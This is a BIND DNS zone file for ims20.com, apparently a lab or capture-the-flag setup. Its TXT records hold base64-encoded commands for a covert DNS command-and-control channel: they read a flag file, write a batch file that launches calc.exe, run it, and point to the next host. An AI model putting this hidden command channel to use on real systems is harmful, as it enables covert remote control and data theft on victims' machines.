; File location: /etc/bind/db.ims20.com
; BIND data file for local loopback interface
;
; We use *.ims20.com as wildcard so that we dont have failed responses.
$TTL    604800
@       IN      SOA     ims20. root.ims20.com. (
                              2         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
@       IN      NS      192.168.178.76
@       IN      A       192.168.178.76
@       IN      AAAA    ::1
*.ims20.com.    IN      A       192.168.178.76
cc.ims20.com.   IN      TXT     "e3JlYWQgQzpcVXNlcnNcUHVibGljXERvY3VtZW50c1xmbGFnLnR4dH17YXNrIGF0dGFjay5pbXMyMC5jb219"
attack.ims20.com.       IN      TXT     "e2NyZWF0ZSBDOlxVc2Vyc1xQdWJsaWNcRG9jdW1lbnRzXGV4cGxvaXQuYmF0ICBDOlxXaW5kb3dzXHN5c3RlbTMyXGNhbGMuZXhlfXthc2sgcnVubmVyLmltczIwLmNvbX0="
runner.ims20.com.       IN      TXT     "e3J1biBDOlxVc2Vyc1xQdWJsaWNcRG9jdW1lbnRzXGV4cGxvaXQuYmF0fQ=="
